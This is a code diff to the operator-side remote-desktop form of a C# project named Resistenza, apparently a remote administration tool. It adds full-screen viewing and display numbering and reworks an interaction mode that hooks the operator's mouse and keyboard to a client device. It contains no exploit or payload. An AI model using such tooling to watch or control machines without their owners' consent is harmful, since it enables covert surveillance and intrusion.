@@ -38,6 +38,7 @@ namespace Resistenza.Server.Forms
 
         private ConnectedClient _Client;
         private Dictionary<string, MonitorDeviceInfo> _DevicesAvailable;
+        private FullScreenDesktop _FullScreenDesktop;
         private int _Fps;
         private int _PreviousSecondFps;
         private readonly object _fpsCounterLock;
@@ -46,6 +47,7 @@ namespace Resistenza.Server.Forms
         private bool _IsStreamingActive;
         private bool _IsStopRequested;
         private bool _IsInteractionActive;
+        private bool _IsFullScreen;
 
         public FrmRemoteDesktop(ConnectedClient Client)
         {
@@ -61,7 +63,7 @@ namespace Resistenza.Server.Forms
             _IsFirstFrame = true;
             _IsStreamingActive = false;
             _IsStopRequested = false;
-            _IsInteractionActive = false;
+            _IsFullScreen = false;
             _fpsCounterLock = new object();
 
             _MouseHook = IntPtr.Zero;
@@ -108,7 +110,7 @@ namespace Resistenza.Server.Forms
                     return;
 
                 case DesktopListDisplaysResponse:
-                    
+
                     DesktopListDisplaysResponse displayPacket = (DesktopListDisplaysResponse)PacketReceived;
                     _DevicesAvailable = new Dictionary<string, MonitorDeviceInfo>();
 
@@ -126,24 +128,19 @@ namespace Resistenza.Server.Forms
                             string noDisplay = "No Display Available";
                             int idx = DisplaysBox.Items.Add(noDisplay);
                             DisplaysBox.Text = noDisplay;
-                            DisplaysBox.SelectedIndex = idx;
+                            DisplaysBox.Enabled = false;
+
                         });
                         return;
                     }
 
-                    int deviceCounter = 0;
+                    int deviceCounter = 1;
                     foreach (var device in displayPacket.Devices)
                     {
-                        // Genera chiave unica per il dizionario
-                        string key = $"{device.FriendlyName}_{deviceCounter++}";
 
-                        if (!_DevicesAvailable.ContainsKey(key))
-                            _DevicesAvailable.Add(key, device);
-
-                        string identifier = $"{device.FriendlyName} ({device.ScreenWidth}x{device.ScreenHeight})" +
+                        string identifier = $"Display {deviceCounter} ({device.ScreenWidth}x{device.ScreenHeight})" +
                                             (device.IsMainMonitor ? " (Main display)" : "");
 
-                        // Aggiorna UI in modo sicuro
                         Invoke(() =>
                         {
                             int idx = DisplaysBox.Items.Add(identifier);
@@ -153,6 +150,8 @@ namespace Resistenza.Server.Forms
                                 DisplaysBox.SelectedIndex = idx;
                             }
                         });
+
+                        deviceCounter++;
                     }
                     return;
 
@@ -171,6 +170,7 @@ namespace Resistenza.Server.Forms
                                 _FrameRateTimer.Elapsed += OnFrameRateTimerElasped;
                                 _FrameRateTimer.Start();
                             }
+                            FrameRateLabel.Location = new Point(this.ClientSize.Width - 60, this.ClientSize.Height - 30);
 
                             FrameRateLabel.Visible = true;
                         }
@@ -184,7 +184,7 @@ namespace Resistenza.Server.Forms
                             gzip.CopyTo(output);
 
                             Bitmap bitmapFrame = new Bitmap(FramePacket.Width, FramePacket.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb);
-                            var rect = new Rectangle(0,0,FramePacket.Width,FramePacket.Height);
+                            var rect = new Rectangle(0, 0, FramePacket.Width, FramePacket.Height);
                             BitmapData bmpData = bitmapFrame.LockBits(rect, ImageLockMode.WriteOnly, bitmapFrame.PixelFormat);
 
                             Marshal.Copy(output.ToArray(), 0, bmpData.Scan0, FramePacket.Height * FramePacket.Pitch);
@@ -192,35 +192,47 @@ namespace Resistenza.Server.Forms
 
                             DesktopPictureBox.SizeMode = PictureBoxSizeMode.StretchImage;
 
-                            DesktopPictureBox.Image = bitmapFrame;
+                            if (_IsFullScreen)
+                            {
+                                _FullScreenDesktop.AddFrame(bitmapFrame);
+                            }
+                            else
+                            {
+                                DesktopPictureBox.Image = bitmapFrame;
+                            }
+
                         }
 
-                        
+
                         _Fps++;
                     }
 
-                    return;              
+                    return;
             }
 
         }
 
         private void OnFrameRateTimerElasped(object? sender, System.Timers.ElapsedEventArgs e)
         {
+            int currentFps;
             lock (_fpsCounterLock)
             {
-                _FrameRateTimer.Stop();
-                Invoke(() => FrameRateLabel.Text = $"FPS: {_PreviousSecondFps.ToString()}");
-                _FrameRateTimer.Dispose();
-                _FrameRateTimer = new Timer(1000);
-                _FrameRateTimer.Elapsed += OnFrameRateTimerElasped;
-                _FrameRateTimer.Start();
-                _PreviousSecondFps = _Fps;
+                currentFps = _Fps;
                 _Fps = 0;
             }
+            Invoke(() => FrameRateLabel.Text = $"FPS: {currentFps}");
         }
 
         private async void FrmRemoteDesktop_Load(object sender, EventArgs e)
         {
+
+
+            DesktopPictureBox.Left = (this.ClientSize.Width - DesktopPictureBox.Width) / 2;
+            DesktopPictureBox.Top = ((this.ClientSize.Height - DesktopPictureBox.Height) / 2) - 20;
+
+            StartWatchingButton.Top = DesktopPictureBox.Bottom + 40;
+            StartWatchingButton.Left = DesktopPictureBox.Left + (DesktopPictureBox.Width - StartWatchingButton.Width) / 2;
+
             DesktopStartRequest ListRequest = new DesktopStartRequest
             {
                 ListDevices = true
@@ -229,8 +241,6 @@ namespace Resistenza.Server.Forms
             await _Client.CustomStream.SendPacketAsync(ListRequest);
 
 
-            //StartWatchingButton.Location = new Point((this.Size.Width - StartWatchingButton.Size.Width / 2), 700);
-            //DesktopPictureBox.Location = new Point((this.Size.Width / 2) - (DesktopPictureBox.Size.Width / 2), DesktopPictureBox.Location.Y);
         }
 
         private async void StartWatchingButton_Click(object sender, EventArgs e)
@@ -238,28 +248,30 @@ namespace Resistenza.Server.Forms
 
             if (!_IsStreamingActive)
             {
-                if (!_IsStopRequested)
+
+                StartWatchingButton.Text = "Stop watching";
+                StartWatchingButton.Location = new Point(150, StartWatchingButton.Location.Y);
+                FullScreenBtn.Location = new Point(this.Size.Width - (150 + StartWatchingButton.Size.Width), StartWatchingButton.Location.Y);
+
+                DesktopStartRequest StartStreamingRequest = new DesktopStartRequest
                 {
-                    StartWatchingButton.Text = "Stop watching";
-                    StartWatchingButton.Location = new Point(150, StartWatchingButton.Location.Y);
-                    InteractionModeBtn.Location = new Point(this.Size.Width - (150 + StartWatchingButton.Size.Width), StartWatchingButton.Location.Y);
+                    StartTransmit = true,
+                    MonitorIndex = Int32.Parse(DisplaysBox.SelectedItem.ToString().Split(' ')[1]) - 1
+                };
 
-                    DesktopStartRequest StartStreamingRequest = new DesktopStartRequest
-                    {
-                        StartTransmit = true,
-                        NameTargetDisplay = DisplaysBox.SelectedText //to fix
-                    };
+                await _Client.CustomStream.SendPacketAsync(StartStreamingRequest);
 
-                    await _Client.CustomStream.SendPacketAsync(StartStreamingRequest);
+                FullScreenBtn.Visible = true;
+                _IsStreamingActive = true;
 
-                    InteractionModeBtn.Visible = true;
-                    _IsStreamingActive = true;
-                }
 
 
             }
             else
             {
+                DesktopPictureBox.Image = null;
+                _IsStopRequested = true;
+
                 var StopStreamingRequest = new CancelRemoteOperationRequest()
                 {
                     TaskId = TasksIds.STREAM_DESKTOP_TASK_ID
@@ -267,13 +279,12 @@ namespace Resistenza.Server.Forms
                 };
                 await _Client.CustomStream.SendPacketAsync(StopStreamingRequest);
 
-                _IsStopRequested = true;
-
-                InteractionModeBtn.Visible = false;
-                StartWatchingButton.Location = new Point((this.Size.Width / 2) - (StartWatchingButton.Size.Width / 2), StartWatchingButton.Location.Y);
+                FullScreenBtn.Visible = false;
 
 
-                DesktopPictureBox.Image = null;
+                StartWatchingButton.Left = DesktopPictureBox.Left + (DesktopPictureBox.Width - StartWatchingButton.Width) / 2;
+
+                DeactivateFullScreen();
                 StartWatchingButton.Text = "Start watching";
                 FrameRateLabel.Visible = false;
                 _IsStreamingActive = false;
@@ -293,39 +304,39 @@ namespace Resistenza.Server.Forms
         private IntPtr MouseEventCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
 
-            if (nCode != 0)//viene inviato dal processo corrente
-            {
-                MouseMessages Message = (MouseMessages)wParam;
+            //if (nCode != 0)//viene inviato dal processo corrente
+            //{
+            //    MouseMessages Message = (MouseMessages)wParam;
 
-                switch (Message)
-                {
-                    case MouseMessages.WM_RBUTTONDOWN:
-                    case MouseMessages.WM_LBUTTONDOWN:
+            //    switch (Message)
+            //    {
+            //        case MouseMessages.WM_RBUTTONDOWN:
+            //        case MouseMessages.WM_LBUTTONDOWN:
 
-                        Point ScreenPos = Cursor.Position;
-                        Point controlPos = DesktopPictureBox.PointToClient(ScreenPos);
+            //            Point ScreenPos = Cursor.Position;
+            //            Point controlPos = DesktopPictureBox.PointToClient(ScreenPos);
 
-                        MonitorDeviceInfo info = GetInfoOfSelectedMonitor();
-                        int ClientScreenWidth = info.ScreenWidth;
-                        int ClientScreenHeight = info.ScreenHeight;
+            //            MonitorDeviceInfo info = GetInfoOfSelectedMonitor();
+            //            int ClientScreenWidth = info.ScreenWidth;
+            //            int ClientScreenHeight = info.ScreenHeight;
 
-                        int ClientX = (controlPos.X * ClientScreenWidth) / DesktopPictureBox.Width;
-                        int ClientY = (controlPos.Y * ClientScreenHeight) / DesktopPictureBox.Height;
+            //            int ClientX = (controlPos.X * ClientScreenWidth) / DesktopPictureBox.Width;
+            //            int ClientY = (controlPos.Y * ClientScreenHeight) / DesktopPictureBox.Height;
 
-                        DesktopMouseActionRequest MouseEventRequest = new DesktopMouseActionRequest()
-                        {
-                            MousePosX = ClientX,
-                            MousePosY = ClientY,
-                            MouseMessage = Message,
-                        };
+            //            DesktopMouseActionRequest MouseEventRequest = new DesktopMouseActionRequest()
+            //            {
+            //                MousePosX = ClientX,
+            //                MousePosY = ClientY,
+            //                MouseMessage = Message,
+            //            };
 
-                        Task sendT = _Client.CustomStream.SendPacketAsync(MouseEventRequest);
-                        sendT.Wait();
-                        break;
+            //            Task sendT = _Client.CustomStream.SendPacketAsync(MouseEventRequest);
+            //            sendT.Wait();
+            //            break;
 
-                }
+            //    }
 
-            }
+            //}
 
             return IntPtr.Zero;
         }
@@ -339,25 +350,6 @@ namespace Resistenza.Server.Forms
         }
         private void EnableKeyboardHook()
         {
-
-        }
-        private void InteractionModeBtn_Click(object sender, EventArgs e)
-        {
-
-            if (_IsInteractionActive)
-            {
-                InteractionModeBtn.Text = "Interaction Mode: Off";
-                _IsInteractionActive = false;
-            }
-            else
-            {
-                InteractionModeBtn.Text = "Interaction Mode: On";
-                _IsInteractionActive = true;
-            }
-
-
-
-
 
         }
 
@@ -380,15 +372,87 @@ namespace Resistenza.Server.Forms
             }
         }
 
-        private void DesktopPictureBox_LoadCompleted(object sender, AsyncCompletedEventArgs e)
-        {
-            DesktopPictureBox.Location = new Point((this.ClientSize.Width - DesktopPictureBox.Width) / 2, DesktopPictureBox.Location.Y);
 
-        }
 
         private void DesktopPictureBox_Click(object sender, EventArgs e)
         {
 
+        }
+
+        private void DesktopPictureBox_DoubleClick(object sender, EventArgs e)
+        {
+            if (!_IsFullScreen)
+            {
+                ActivateFulLScreen();
+                FullScreenBtn.Text = "Full screen: On";
+            }
+        }
+
+        private void ActivateFulLScreen()
+        {
+            _FullScreenDesktop = new FullScreenDesktop(_Client, DisplaysBox.SelectedItem.ToString());
+            _IsFullScreen = true;
+            _FullScreenDesktop.FormClosed += _FullScreenDesktop_FormClosed;
+
+            InteractionPictureBox.Top = DesktopPictureBox.Top + 10;
+            InteractionPictureBox.Left = DesktopPictureBox.Left + 10;
+            InteractionPictureBox.Visible = true;
+
+            DesktopPictureBox.Image = null;
+
+
+            _FullScreenDesktop.Show();
+        }
+
+        private void DeactivateFullScreen()
+        {
+            _FullScreenDesktop?.Close();
+            InteractionPictureBox.Visible = false;
+        }
+
+        private void _FullScreenDesktop_FormClosed(object? sender, FormClosedEventArgs e)
+        {
+            _IsFullScreen = false;
+        }
+
+        private void FullScreenBtn_Click(object sender, EventArgs e)
+        {
+            if (!_IsFullScreen)
+            {
+                ActivateFulLScreen();
+                FullScreenBtn.Text = "Full screen: On";
+            }
+            else
+            {
+                DeactivateFullScreen();
+            }
+        }
+
+        private async void InteractionPictureBox_Click(object sender, EventArgs e)
+        {
+
+            if (_IsInteractionActive)
+            {
+                InteractionPictureBox.Image = Resistenza.Server.Properties.Resources.mouse_clicker;
+                _IsInteractionActive = false;
+                _FullScreenDesktop.StopInteractionMode();
+            }
+            else
+            {
+                GenericNotificationLabel.Location = new Point(10, this.ClientSize.Height - 30);
+                GenericNotificationLabel.Text = "Interactione mode activated! Your mouse and keyboard are hooked to the client device, click the icon again to disable!";
+                GenericNotificationLabel.Visible = true;
+
+                InteractionPictureBox.Image = Resistenza.Server.Properties.Resources.no_mouse_clicker;
+
+                _FullScreenDesktop.StartInteractionMode();
+
+                _IsInteractionActive = true;
+            }
+
+            
+
+            
         }
     }
 }
